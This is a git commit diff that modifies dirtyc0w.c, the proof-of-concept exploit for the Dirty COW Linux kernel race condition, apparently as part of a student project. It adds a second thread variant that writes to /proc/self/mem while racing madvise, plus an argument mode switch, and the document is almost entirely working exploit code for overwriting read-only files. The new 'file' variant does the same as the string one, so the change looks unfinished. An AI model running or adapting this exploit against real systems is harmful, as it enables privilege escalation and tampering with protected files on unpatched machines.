8cc80d617222cdd27912ece4634b227076698cb7
chengsteven <stevencheng@jhu.edu>
2017-12-05 12:14:17 -0800

    some modifications for sva proj

--- dirtyc0w.c
+++ dirtyc0w.c
@@ -29,7 +29,7 @@ void *map;
 int f;
 struct stat st;
 char *name;
- 
+
 void *madviseThread(void *arg)
 {
   char *str;
@@ -46,8 +46,8 @@ You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vu
   }
   printf("madvise %d\n\n",c);
 }
- 
-void *procselfmemThread(void *arg)
+
+void *procselfmemThreadString(void *arg)
 {
   char *str;
   str=(char*)arg;
@@ -69,16 +69,38 @@ You have to reset the file pointer to the memory position.
   }
   printf("procselfmem %d\n\n", c);
 }
- 
- 
+
+void *procselfmemThreadFile(void *arg)
+{
+  char *str;
+  str=(char*)arg;
+/*
+You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
+>  The in the wild exploit we are aware of doesn't work on Red Hat
+>  Enterprise Linux 5 and 6 out of the box because on one side of
+>  the race it writes to /proc/self/mem, but /proc/self/mem is not
+>  writable on Red Hat Enterprise Linux 5 and 6.
+*/
+  int f=open("/proc/self/mem",O_RDWR);
+  int i,c=0;
+  for(i=0;i<100000000;i++) {
+/*
+You have to reset the file pointer to the memory position.
+*/
+    lseek(f,(uintptr_t) map,SEEK_SET);
+    c+=write(f,str,strlen(str));
+  }
+  printf("procselfmem %d\n\n", c);
+}
+
 int main(int argc,char *argv[])
 {
 /*
 You have to pass two arguments. File and Contents.
 */
-  if (argc<3) {
+  if (argc<4) {
   (void)fprintf(stderr, "%s\n",
-      "usage: dirtyc0w target_file new_content");
+      "usage: dirtyc0w [file | string] target_file new_content");
   return 1; }
   pthread_t pth1,pth2;
 /*
@@ -103,8 +125,12 @@ You have to open with PROT_READ.
 /*
 You have to do it on two threads.
 */
-  pthread_create(&pth1,NULL,madviseThread,argv[1]);
-  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
+  pthread_create(&pth1,NULL,madviseThread,argv[2]);
+  if (strcmp(argv[1], "string") == 0) {
+    pthread_create(&pth2,NULL,procselfmemThreadString,argv[3]);
+  } else {
+    pthread_create(&pth2,NULL,procselfmemThreadFile,argv[3]);
+  }
 /*
 You have to wait for the threads to finish.
 */
